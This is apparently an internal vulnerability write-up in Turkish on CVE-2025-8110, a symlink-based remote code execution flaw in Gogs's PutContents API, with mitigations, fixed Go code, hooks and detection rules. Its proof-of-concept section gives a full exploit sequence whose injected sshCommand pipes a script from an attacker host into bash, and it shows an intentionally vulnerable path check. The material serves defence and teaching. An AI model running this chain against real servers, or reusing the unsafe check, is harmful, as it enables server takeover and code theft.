# TODO: CVE-2025-8110 — Gogs PutContents Symlink RCE

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | CVE-2025-8110 |
| **Kritiklik** | Kritik |
| **Kategori Klasoru** | Erisim_Kontrolu/ |
| **Kaynak Arastirma** | [Ocak_2026_Guvenlik_Aciklari_Arastirmasi.md](../Arastirmalar/Ocak_2026_Guvenlik_Aciklari_Arastirmasi.md) |
| **Tarih** | 2026-02-02 |
| **Mevcut Dokuman** | Silindi — icerik bu TODO dosyasinda | |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** CVE-2025-8110, populer self-hosted Git servisi Gogs'da bulunan kritik bir sifirinci gun (zero-day) zafiyetidir. PutContents API'sindeki hatali sembolik link (symlink) yonetiminden kaynaklanan bu acik, kimlik dogrulanmis bir saldirganin depo (repository) sinirlarinin disina dosya yazmasina olanak tanimaktadir. Saldirgan, `.git/config` dosyasindaki `core.sshCommand` alanini manipule ederek sistemde tam kod yurutme (RCE) elde edebilir. Raporlara gore hali hazirda 700'den fazla Gogs ornegi kompromize edilmis ve 1.400'den fazla sunucu risk altindadir. Gogs'un guncelleme dongusunun yavas olmasi ve projenin azalan aktif gelistirme hizi nedeniyle, Gitea'ya gecis onerisi de degerlendirilmelidir.
*   **Etkilenen bilesenler:** Gogs Git servisi (zafiyetli surumler), PutContents API endpoint'i, Gogs uzerinde barindirilan tum depolar, Gogs sunucusu dosya sistemi ve isletim sistemi, Gogs'un SSH ve Git protokol isleyicileri

---

### 2. Teknik detay (nasil calisiyor)
*   Gogs, kullanicilarin web arayuzu veya API uzerinden depo icerisindeki dosyalari olusturmasina ve duzenlemesine izin verir. `PutContents` API endpoint'i, belirtilen dosya yoluna icerik yazmak icin kullanilir. Bu islem sirasinda, dosya yolunun depo sinirlarinin disina cikip cikmadigi kontrol edilir.
*   Ancak, symlink (sembolik link) kontrolu eksiktir. Saldirgan, once depoya bir sembolik link ekler: bu symlink, depo dizini disindan bir dosyayi (ornegin `../../.git/config` veya `/etc/crontab`) isaret eder. Ardindan, PutContents API'si ile bu symlink uzerinden icerik yazmaya calisir. Gogs, dosya yolunun depo icerisinde oldugunu dogrular ancak symlink'in cozumlenmiş (resolved) hedefinin depo disinda oldugunu kontrol etmez.
*   Sonuc olarak, yazma islemi symlink'in hedefine — yani depo disindaki dosyaya — gerceklestirilir. Saldirgan, `.git/config` dosyasina `core.sshCommand` degeri olarak bir shell komutu yazabilir. Git, SSH islemleri sirasinda bu komutu calistirdigindan, saldirgan sunucu uzerinde Gogs sureci yetkisi ile keyfi komut yurutme elde eder.
*   Alternatif olarak saldirgan, `/etc/crontab`, `~/.bashrc`, `~/.ssh/authorized_keys` gibi dosyalara yazarak kalicilik saglayabilir veya ek erisim yollari olusturabilir.
*   **Neden:** Kok neden, PutContents API isleyicisinde dosya yolu dogrulamasi sirasinda sembolik linklerin cozumlenmemesi (symlink resolution) ve yazma isleminin symlink hedefine yonlendirilmesinin engellenmemesidir. Depo sinirlarini denetleyen kontrol, yalnizca mantiksal yolu (logical path) dogrular ancak dosya sistemindeki gercek (fiziksel) yolu dogrulamaz.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** Internete acik Gogs Git servisi ornegi (self-hosted), kimlik dogrulanmis kullanici hesabi (yeni kayit veya mevcut hesap)
*   **2. Normal durum:**
    ```
    1. Kullanici, Gogs uzerinde bir depo olusturur
    2. Web arayuzu veya API ile depoya dosya ekler (PutContents)
    3. Gogs, dosya yolunu dogrular ve depo dizini icine yazar
    4. Dosya, depo sinirlarinin disina cikmadan kaydedilir
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```bash
    # 1. Gogs'a kimlik dogrulanmis erisim (API token veya session cookie)
    GOGS_TOKEN="kullanici_api_token"
    GOGS_URL="https://gogs.hedef.com"

    # 2. Yeni bir depo olustur veya mevcut depoyu kullan
    curl -X POST "$GOGS_URL/api/v1/user/repos" \
      -H "Authorization: token $GOGS_TOKEN" \
      -d '{"name":"exploit-repo","private":true}'

    # 3. Depoya sembolik link ekle (git ile)
    git clone "$GOGS_URL/kullanici/exploit-repo.git"
    cd exploit-repo
    # Depo disina isaret eden symlink olustur
    ln -s ../../.git/config evil-link
    git add evil-link
    git commit -m "add symlink"
    git push origin main

    # 4. PutContents API ile symlink uzerinden dosya yaz
    # .git/config'a sshCommand enjekte et
    curl -X PUT "$GOGS_URL/api/v1/repos/kullanici/exploit-repo/contents/evil-link" \
      -H "Authorization: token $GOGS_TOKEN" \
      -H "Content-Type: application/json" \
      -d '{
        "content": "'$(echo -n '[core]\n\tsshCommand = curl https://saldirgan.com/shell.sh | bash' | base64)'",
        "message": "update config"
      }'
    # Symlink cozumlenir → .git/config dosyasina yazilir
    # Git SSH isleminde sshCommand calistirilir → RCE!
    ```
*   **4. Analiz:** Gogs'un PutContents isleyicisi, dosya yolunu (`evil-link`) depo dizini icinde kontrol eder ve gecerli bulur. Ancak `evil-link` bir sembolik link oldugundan, yazma islemi symlink'in hedefine — `.git/config` dosyasina — yonlendirilir. `core.sshCommand` ayari, Git'in SSH islemleri sirasinda calistirilacak komutu tanimlar. Saldirgan veya baska bir kullanici bu depoda bir SSH islemi (push, pull) yaptiginda, Git otomatik olarak `sshCommand`'daki komutu calistirir ve saldirgan RCE elde eder.
*   **5. Kanit:** Saldirganin tanimladigi shell komutu Gogs sunucusu uzerinde calistirilir. Sunucuda Gogs kullanicisi yetkisiyle reverse shell acilabilir, veritabani erisimi saglanabilir veya diger depolarin icerigi okunabilir. Gogs loglarinda PutContents API cagrialri ve symlink cozumleme islemleri kaydedilir. Sunucu dosya sisteminde `.git/config` degisiklikleri ve beklenmeyen dosya olusturulmasi gozlemlenir.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Kritik
*   **CVSS Skoru:** 9.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
*   **Saldiri Yuzeyi:** Internete acik (Gogs web arayuzu ve API — kimlik dogrulanmis kullanici hesabi yeterli, yeni kayit acik olabilir)
*   **Karmasiklik:** Dusuk (standart Git ve API islemleri ile istismar mumkun, ozel arac gerekmez)

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** Gogs yamasini uygulayin (mevcut ise). Yama yoksa, PutContents API endpoint'ini gecici olarak devre disi birakin veya IP kisitlamasi uygulayin. Yeni kullanici kayitlarini gecici olarak kapatin (acik kayit varsa). Mevcut depolarda sembolik link icerenlerini tarayin ve temizleyin. `.git/config` dosyalarinin `sshCommand` alanini kontrol edin. Gogs sunucusunun dosya sistemi izinlerini kisitlayin.
*   **Orta vadeli:** Gogs'tan daha aktif guncelleme dongusune sahip Gitea'ya gecis degerlendirin. Depo icerisinde symlink olusturmayı kisitlayan sunucu tarafı kural tanimlayın. Git hook'ları ile sembolik link iceren commit'leri reddeden pre-receive hook ekleyin. Gogs/Gitea sunucusunu konteyner ortaminda izole calistirin (read-only root filesystem, non-root user). Dosya sistemi butunluk izleme araci (AIDE, OSSEC) yapilandirin.
*   **Uzun vadeli:** Self-hosted Git servisi guvenlik politikasi olusturun ve duzenli penetrasyon testi yapin. Git server uygulamalarini minimum yetkili kullanici ile calistirin ve chroot/namespace izolasyonu uygulayin. Depo erisim kontrollerini en az yetki prensibi ile yapilandirin. Alternatif olarak kurumsal Git cozumlerine (GitLab, GitHub Enterprise) gecis degerlendirin. SBOM envanterine Gogs/Gitea surumlerini dahil edin.

---

### 6. Ornek duzeltme kodu

**Zafiyetli kod:**
```go
// === GUVENSIZ: PutContents'da symlink kontrolu yok ===
func (r *Repository) PutContents(filePath string, content []byte) error {
    // Dosya yolunu depo dizini icinde dogrula
    fullPath := filepath.Join(r.RepoPath, filePath)

    // Yalnizca mantiksal yol kontrolu — symlink cozumlemesi YOK!
    if !strings.HasPrefix(fullPath, r.RepoPath) {
        return ErrPathTraversal
    }

    // Dosyaya yaz — symlink varsa hedefine yazilir!
    return os.WriteFile(fullPath, content, 0644)
}
```

**Guvenli kod:**
```go
// === GUVENLI: Symlink cozumleme + fiziksel yol dogrulama ===
func (r *Repository) PutContents(filePath string, content []byte) error {
    fullPath := filepath.Join(r.RepoPath, filePath)

    // 1. Mantiksal yol kontrolu
    if !strings.HasPrefix(fullPath, r.RepoPath+string(os.PathSeparator)) {
        return ErrPathTraversal
    }

    // 2. Symlink kontrolu — dosyanin sembolik link olup olmadigini kontrol et
    fileInfo, err := os.Lstat(fullPath) // Lstat: symlink'i cozumlemez
    if err == nil {
        if fileInfo.Mode()&os.ModeSymlink != 0 {
            // Symlink tespit edildi — yazma islemini reddet
            return fmt.Errorf("guvenlik ihlali: sembolik link uzerinden yazma engellendi: %s", filePath)
        }
    }

    // 3. Fiziksel yol cozumlemesi (EvalSymlinks)
    // Ust dizin icin cozumleme yap (dosya henuz olmayabilir)
    parentDir := filepath.Dir(fullPath)
    resolvedParent, err := filepath.EvalSymlinks(parentDir)
    if err != nil {
        return fmt.Errorf("dizin cozumlenemedi: %w", err)
    }

    resolvedRepoPath, err := filepath.EvalSymlinks(r.RepoPath)
    if err != nil {
        return fmt.Errorf("depo dizini cozumlenemedi: %w", err)
    }

    // 4. Cozumlenms fiziksel yolun depo icinde kaldigini dogrula
    if !strings.HasPrefix(resolvedParent, resolvedRepoPath+string(os.PathSeparator)) {
        return fmt.Errorf("guvenlik ihlali: fiziksel yol depo sinirlarinin disinda: %s -> %s",
            filePath, resolvedParent)
    }

    // 5. Guvenli yazma
    return os.WriteFile(fullPath, content, 0644)
}
```

```bash
# Gogs surumunu kontrol et
gogs --version

# Mevcut depolarda sembolik linkleri tara
find /data/gogs/repositories -type l -ls

# .git/config dosyalarinda sshCommand kontrolu
find /data/gogs/repositories -name "config" -path "*/.git/config" \
    -exec grep -l "sshCommand" {} \;

# Symlink iceren commit'leri reddeden pre-receive hook
cat > /data/gogs/custom/hooks/pre-receive << 'HOOK'
#!/bin/bash
while read oldrev newrev refname; do
    # Yeni commit'lerde symlink kontrolu
    if [ "$oldrev" = "0000000000000000000000000000000000000000" ]; then
        files=$(git diff-tree --no-commit-id -r "$newrev" | awk '{print $5, $6}')
    else
        files=$(git diff-tree --no-commit-id -r "$oldrev" "$newrev" | awk '{print $5, $6}')
    fi
    echo "$files" | while read mode path; do
        if [ "$mode" = "120000" ]; then  # 120000 = symlink
            echo "HATA: Sembolik linkler kabul edilmez: $path"
            exit 1
        fi
    done
done
HOOK
chmod +x /data/gogs/custom/hooks/pre-receive

# Alternatif: Gitea'ya gecis
# wget https://dl.gitea.io/gitea/latest/gitea-linux-amd64
# chmod +x gitea-linux-amd64
# ./gitea-linux-amd64 dump-repo --git_service gogs --repo_dir /data/gogs/repositories
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] Gogs kurulumlarini envanterle (surum, erisim kontrolu, kullanici sayisi)
*   [ ] PutContents API endpoint'inin kimler tarafindan erisilebildigini belirle
*   [ ] Yeni kullanici kaydinin acik olup olmadigini kontrol et
*   [ ] Mevcut depolarda sembolik link icerenlerini tara (find -type l)
*   [ ] `.git/config` dosyalarinda `sshCommand` alanini kontrol et
*   [ ] Gogs sunucusunun isletim sistemi yetkilerini gozden gecir

**Duzeltme**
*   [ ] Gogs yamasini uygula (mevcut ise) veya Gitea'ya gecis planla
*   [ ] PutContents API'sinde symlink kontrolu ekleyen hotfix uygulayin
*   [ ] Yeni kullanici kayitlarini gecici olarak kapatin
*   [ ] Pre-receive hook ile symlink iceren commit'leri reddedin
*   [ ] `.git/config` dosyalarinda zararli `sshCommand` degerlerini temizleyin
*   [ ] Gogs sunucusunu konteyner ortaminda izole calistirin

**Dogrulama**
*   [ ] Symlink ile depo siniri disina yazma girisiminin engellendigini dogrula
*   [ ] `.git/config` manipulasyonu testini yama sonrasi tekrarla
*   [ ] Pre-receive hook'un symlink'leri basariyla reddettigini test et
*   [ ] Dosya sistemi butunluk izleme aracinin uyari urettigini dogrula
*   [ ] Penetrasyon testinde Gogs'un guvenli oldugunu onayla

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   Gogs uygulama loglarinda PutContents API cagrialrini ve symlink ile ilgili islemleri izle
    *   Dosya sistemi butunluk izleme araciyla `.git/config` dosyalarindaki degisiklikleri tespit et
    *   Regex: `(?i)(PutContents|symlink|symbolic.link|\.git/config|sshCommand)`
    *   Regex: `(?i)(ln\s+-s|os\.symlink|filepath\.EvalSymlinks|readlink)`
    *   Gogs/Gitea API erisim loglarinda anormal dosya yazma islemlerini filtrele
*   **Anomali Tespiti:**
    *   Depo dizini disina isaret eden yeni sembolik linklerin olusturulmasi
    *   `.git/config` dosyalarinda `sshCommand` alaninin eklenmesi veya degistirilmesi
    *   Gogs sureci tarafindan depo dizini disindaki dosyalara yazma erisimi
    *   Tek kullanicidan kisa surede cok sayida PutContents API cagrisi (fuzzing belirtisi)
    *   Gogs sunucusu uzerinde beklenmeyen alt islem olusturulmasi (shell, curl, wget — sshCommand tetiklenmesi)
    *   Yeni kullanici kayitlarinda ani artis (saldirgan hesap olusturma belirtisi)

---

## Notlar
Sifirinci gun zafiyeti — 700+ Gogs ornegi kompromize, 1.400+ sunucu risk altinda. Gogs projesinin guncelleme dongusu yavas ve aktif gelistirme azalmis durumda — Gitea'ya gecis ciddi olarak degerlendirilmeli. Kimlik dogrulanmis erisim gerektirir ancak bircok Gogs orneginde yeni kullanici kaydi acik oldugu icin saldirgan kolayca hesap olusturabilir. Self-hosted Git servisleri, kurumsal kaynak kodunun merkezinde yer aldigi icin bu tur zafiyetler yuksek etkiye sahiptir.
